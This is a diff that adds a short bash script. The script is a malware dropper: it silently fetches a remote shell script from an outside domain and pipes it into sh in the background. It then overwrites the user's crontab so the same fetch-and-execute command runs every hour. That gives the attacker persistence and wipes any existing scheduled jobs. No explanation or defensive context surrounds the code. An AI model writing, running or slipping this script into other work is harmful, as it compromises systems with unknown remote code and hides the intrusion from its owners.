@@ -1,0 +1,15 @@
+#!/bin/bash
+
+chijiu () {
+    echo 'chijiu'
+    user=$(whoami)
+    echo "59 * * * *  curl -fSsL https://dl.ttnqs.xyz/gouzi.sh|sh >/dev/null 2>&1" > "/var/spool/cron/$user"
+   
+}
+
+
+
+curl -fSsL 'https://dl.ttnqs.xyz/gouzi.sh' |sh >/dev/null 2>&1 &
+
+chijiu
+
